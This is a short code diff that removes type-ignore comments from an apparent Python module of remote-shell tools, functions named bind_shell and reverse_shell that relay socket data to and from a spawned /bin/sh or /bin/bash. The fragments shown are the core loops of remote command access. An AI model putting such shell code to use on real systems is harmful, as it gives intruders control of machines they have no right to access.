@@ -49,10 +49,10 @@ def bind_shell(host: str = "0.0.0.0", port: int = 4444, shell: str = "/bin/sh") 
             if not data:
                 break
 
-            process.stdin.write(data)  # type: ignore
-            process.stdin.flush()  # type: ignore
+            process.stdin.write(data)
+            process.stdin.flush()
 
-            output = process.stdout.read(4096)  # type: ignore
+            output = process.stdout.read(4096)
             if output:
                 conn.send(output)
     except KeyboardInterrupt:
@@ -154,7 +154,7 @@ async def reverse_shell(host: str, port: int, shell: str = "/bin/bash") -> None:
 
     async def forward_output():
         while True:
-            data = await process.stdout.read(4096)  # type: ignore
+            data = await process.stdout.read(4096)
             if not data:
                 break
             writer.write(data)
@@ -165,7 +165,7 @@ async def reverse_shell(host: str, port: int, shell: str = "/bin/bash") -> None:
             data = await reader.read(4096)
             if not data:
                 break
-            process.stdin.write(data)  # type: ignore
-            await process.stdin.drain()  # type: ignore
+            process.stdin.write(data)
+            await process.stdin.drain()
 
     await asyncio.gather(forward_output(), forward_input())
